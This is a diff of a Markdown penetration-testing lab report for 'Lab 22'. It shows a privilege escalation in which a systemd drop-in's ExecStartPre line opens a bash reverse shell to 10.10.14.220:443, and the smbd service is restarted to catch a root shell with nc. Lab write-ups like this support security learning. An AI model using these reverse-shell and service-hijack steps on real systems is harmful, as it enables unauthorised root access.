@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 – Lab 22
 created: 2026-11-20T00:02:44.797Z
-modified: 2026-11-20T06:05:28.750Z
+modified: 2026-11-20T06:08:53.022Z
 tags:
   - pentest
   - linux
@@ -611,8 +611,23 @@ ExecStartPre=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.220/443 0>&1'
 listening on [any] 443 ...
 ```
 
-```
-```
+![[Template/Image/Pasted image 20261120150842.png]]
 
 ```
+marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
+marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd.service
+```
+
+![[Template/Image/Pasted image 20261120150828.png]]
+
+```
+└─$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.220] from (UNKNOWN) [10.129.244.177] 33352
+bash: cannot set terminal process group (3552): Inappropriate ioctl for device
+bash: no job control in this shell
+root@abducted:/# whoami; id
+whoami; id
+root
+uid=0(root) gid=0(root) groups=0(root)
 ```
